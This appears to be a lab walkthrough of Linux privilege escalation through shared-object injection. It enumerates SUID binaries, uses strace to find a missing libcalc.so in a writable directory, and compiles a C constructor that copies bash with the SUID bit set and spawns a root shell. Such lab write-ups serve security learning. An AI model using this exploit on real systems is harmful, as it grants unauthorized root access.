# Dectection


```bash

find / -type f -perm -04000 -ls 2>/dev/null

```


![image](https://user-images.githubusercontent.com/96658935/147664563-030ce722-bbb3-4fbf-9739-db7c7f23a632.png)

From the output, make note of all the SUID binaries.


```bash
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
```

From the output, notice that a .so file is missing from a writable directory.


![image](https://user-images.githubusercontent.com/96658935/147664797-46d4bec4-f161-46c9-ade2-2fe64cabd55c.png)



![image](https://user-images.githubusercontent.com/96658935/147665288-31d348f7-3cf9-456b-8896-cc950ca4118d.png)


I see that I have permissions to wirte to /user/home




![image](https://user-images.githubusercontent.com/96658935/147665637-a6526c01-2291-4248-8df1-84a49d0b40b1.png)

Wehn the /sr/local/bin/suid-so command is ran its looking for the /home/user/.config/libcalc.so file but it cannot find it. SO because I have writable access to /home/user I'll create that file and put something for my benefit in it.


# Exploitation

![image](https://user-images.githubusercontent.com/96658935/147665944-482df0f8-0abf-47a8-af49-d88c3283ae38.png)




```bash


#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}

```


![image](https://user-images.githubusercontent.com/96658935/147666042-d9b297b4-f89d-4e1b-ae2b-73e94257e7b2.png)


(Save the file as x.c) I placed the code from above in the libcalc.c file

now compile the file

```bash
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
```

now execute the command and become root

![image](https://user-images.githubusercontent.com/96658935/147666327-deae6c02-a2e1-4342-94cb-99efce64a7e8.png)


